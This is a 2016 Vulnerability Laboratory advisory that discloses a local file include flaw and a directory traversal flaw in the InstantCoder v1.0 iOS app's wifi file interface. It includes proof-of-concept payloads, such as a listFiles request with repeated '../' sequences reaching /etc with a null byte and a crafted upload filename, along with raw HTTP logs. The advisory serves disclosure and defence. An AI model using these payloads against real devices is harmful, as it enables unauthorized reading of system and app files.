@@ -1,0 +1,298 @@
+Document Title:
+===============
+InstantCoder v1.0 iOS - Multiple Web Vulnerabilities
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1738
+
+
+Release Date:
+=============
+2016-02-22
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1738
+
+
+Common Vulnerability Scoring System:
+====================================
+7
+
+
+Product & Service Introduction:
+===============================
+You are one of the best developers in the world and you would like to code anytime, anywhere. CuteCoder makes it possible 
+for your to code and debug web apps on your lovely iPhone and iPad.
+
+(Copy of the Homepage: https://itunes.apple.com/ai/app/instantcoder/id1067517686 )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Core Research Team discovered multiple vulnerabilities in the official InstantCoder mobile iOS web-application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2016-02-22: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Shumin Sun
+Product: InstantCoder - iOS (Web-Application) 1.0
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+1.1
+A local file include web vulnerability has been discovered in the official InstantCoder v1.0 iOS mobile web-application (wifi).
+The file include vulnerability allows remote attackers to unauthorized include local file/path requests or system specific path 
+commands to compromise the mobile web-application.
+
+The web vulnerability is located in the `filename` value of the `./toolkit/upload` module. Remote attackers are able to inject own 
+files with malicious `filename` values in the `file upload` POST method request to compromise the mobile web-application. The local 
+file/path include execution occcurs in the index file dir listing and sub folders of the wifi interface. The attacker is able to 
+inject the lfi payload by usage of the wifi interface or local file sync function. 
+
+Attackers are also able to exploit the filename issue in combination with persistent injected script code to execute different malicious 
+attack requests. The attack vector is located on the application-side of the wifi service and the request method to inject is POST. 
+
+The security risk of the local file include vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.4. 
+Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account. 
+Successful exploitation of the local file include vulnerability results in mobile application compromise or connected device component compromise.
+
+Request Method(s):
+				[+] [POST]
+
+Vulnerable Module(s):
+				[+] ./toolkit/upload
+
+Vulnerable Parameter(s):
+				[+] filename
+
+Affected Module(s):
+				[+] Index File Dir Listing (http://localhost:8080/)
+
+
+
+1.2
+A directory traversal web vulnerability has been discovered in the official InstantCoder v1.0 iOS mobile web-application (wifi).
+The vulnerability allows remote attackers to unauthorized access path variables to compromise the web-application or mobile device.
+
+The directory traversal web vulnerability is located in the `path` value of the `listFiles` module. Remote attackers are able to 
+manipulate the path variable GET or POST method request to compromise the application. The request method to inject the payload is 
+POST and the request method to execute is GET. The attack vector of the vulnerability is located on the application-side. The path 
+variable is not encoded or parsed. Thus allows an attacker to inject to unauthorized access the local system or app path.
+
+The security risk of the path traversal vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 7.0. 
+Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application (wifi ui) user account. 
+Successful exploitation of the path traversal vulnerability results in mobile application compromise or compromise of connected device components.
+
+
+Request Method(s):
+				[+] [POST]
+
+Vulnerable Module(s):
+				[+] ./listFiles
+
+Vulnerable Parameter(s):
+				[+] path
+
+Affected Module(s):
+				[+] Index File Dir Listing (http://localhost:8080/)
+
+
+Proof of Concept (PoC):
+=======================
+1.1
+The local file include web vulnerability can be exploited by remote attackers with wifi panel access and without user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+PoC: Payload
+http://localhost:8080/toolkit/index.html./[LOCAL FILE INCLUDE VULNERABILITY!]
+
+
+PoC: Vulnerable Source
+javascript:changePath("./[LOCAL FILE INCLUDE VULNERABILITY!]");
+
+
+--- PoC Session Logs [POST] ---
+Status: 200[OK]
+POST http://localhost:8080/toolkit/upload?path= Load Flags[LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[162] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0]
+      Accept[*/*]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost:8080/toolkit/index.html]
+      Content-Length[819]
+      Content-Type[multipart/form-data; boundary=---------------------------29343138867419]
+      Connection[keep-alive]
+   POST-Daten:
+      POST_DATA[-----------------------------29343138867419
+Content-Disposition: form-data; name="path"
+-----------------------------29343138867419
+Content-Disposition: form-data; name="upload1"; filename="./[LOCAL FILE INCLUDE VULNERABILITY!]"
+Content-Type: image/png
+-
+Status: 200[OK]
+GET http://localhost:8080/toolkit/index.html Load Flags[VALIDATE_ALWAYS LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[4995] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Connection[keep-alive]
+      Cache-Control[max-age=0]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[4995]
+      Date[Mon, 22 Feb 2016 08:33:04 GMT]
+
+
+Reference(s):
+http://localhost:8080/toolkit/upload
+http://localhost:8080/toolkit/index.html
+
+
+
+1.2
+Thedirectory traversal web vulnerability can be exploited by remote attackers with wifi panel access and without user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+PoC: Payload
+http://localhost:8080/listFiles?path=./.././../../../../../../../../../../
+
+
+PoC: Vulnerable Source
+<p></p>
+<div id="list-file"><a href="javascript:changePath("/.././../../../../../../../../../../etc/%00");"> 
+<div class="folder"><img><iframe></div></a></iframe></div></a></div>
+</div>
+
+
+Status: 200[OK]
+POST http://localhost:8080/listFiles?path=/ Load Flags[LOAD_BACKGROUND  VALIDATE_ALWAYS LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[162] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0]
+      Accept[*/*]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost:8080/toolkit/index.html]
+      Connection[keep-alive]
+      Content-Length[0]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[162]
+      Date[Mon, 22 Feb 2016 08:09:34 GMT]
+-
+Status: 200[OK]
+POST http://localhost:8080/listFiles?path=/.././../../../../../../../../../../etc/%00 Load Flags[LOAD_BACKGROUND  LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[2] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0]
+      Accept[*/*]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost:8080/toolkit/index.html]
+      Connection[keep-alive]
+      Content-Length[0]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[2]
+      Date[Mon, 22 Feb 2016 08:09:37 GMT]
+-
+Status: 200[OK]
+POST http://localhost:8080/listFiles?path=./.././../../../../../../../../../../ Load Flags[LOAD_BACKGROUND  LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[2] Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost:8080]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0]
+      Accept[*/*]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost:8080/toolkit/index.html]
+      Connection[keep-alive]
+      Content-Length[0]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[2]
+      Date[Mon, 22 Feb 2016 08:09:45 GMT]
+
+
+Reference(s):
+http://localhost:8080/listFiles
+
+
+Security Risk:
+==============
+1.1
+The security risk of the local file include web vulnerability in the upload POST method request is estimated as high. (CVSS 6.7)
+
+1.2
+The security risk of the directory traversal web vulnerability in the list path GET method request is estimated as high. (CVSS 7.0)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (research@vulnerability-lab.com) [www.vulnerability-lab.com]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+
+
